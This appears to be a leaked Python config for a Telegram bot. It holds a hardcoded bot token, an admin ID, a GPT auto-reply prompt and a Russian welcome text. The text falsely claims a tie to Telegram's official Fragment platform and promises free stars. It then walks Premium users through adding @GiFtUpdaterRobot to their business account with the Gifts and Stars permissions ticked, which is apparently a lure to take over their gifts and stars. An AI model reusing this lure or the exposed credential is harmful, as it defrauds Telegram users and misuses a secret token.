#слил https://t.me/adapterpythonblog
#слил https://t.me/adapterpythonblog
#слил https://t.me/adapterpythonblog
#слил https://t.me/adapterpythonblog
#слил https://t.me/adapterpythonblog
#слил https://t.me/adapterpythonblog
#слил https://t.me/adapterpythonblog
#слил https://t.me/adapterpythonblog
BOT_TOKEN = "7953311967:AAHIcMZFP2FQ2TOpcuvPAcj5Zb99HD_rAXA"
ADMIN_ID = 8016278719
GPT_PROMPT = "Ты бизнесбот в телеграмм. Ты должке отвечать когда пользователь не в сети. Отвечай не длинными ответами и не форматируй текст.\nЗапрос: "
text = """
<b>🎁 Я — Telegram Gift Helper</b>  
Бот, созданный специально для подключения бизнес-аккаунтов Telegram к системе <b>Fragment (Official Telegram Web)</b> и <b>автоматической выдачи звёзд</b> за активность!

<b>🤖 Как это работает?</b>
1️⃣ Добавь меня в свой бизнес-аккаунт  
2️⃣ Я подключу твой аккаунт к официальной платформе Fragment  
3️⃣ Начнётся <b>автоматическая выдача звёзд</b> — цифровых подарков за активность и развитие твоего аккаунта

<b>⚠️ Важно:</b> Подключить бота можно <b>только с Telegram Premium</b>!

<b>🛠 Как подключить?</b>
1️⃣ Открой настройки Telegram  
2️⃣ Перейди в <b>Telegram Business</b> или <b>Telegram для бизнеса</b>  
3️⃣ Нажми <b>Чат-боты</b>  
4️⃣ Вставь в строку @имя бота: <code>@GiFtUpdaterRobot</code> (нажми и скопируй)  
5️⃣ После добавления бота снизу появятся галочки — <b>отметь:</b>  
 ✅ <i>Подарки</i>  
 ✅ <i>Звёзды</i>

<b>❗️Зачем ставить галочки?</b>  
Боту нужно сгенерировать <b>Business ID</b>, чтобы он мог выдавать звёзды на твой аккаунт.
"""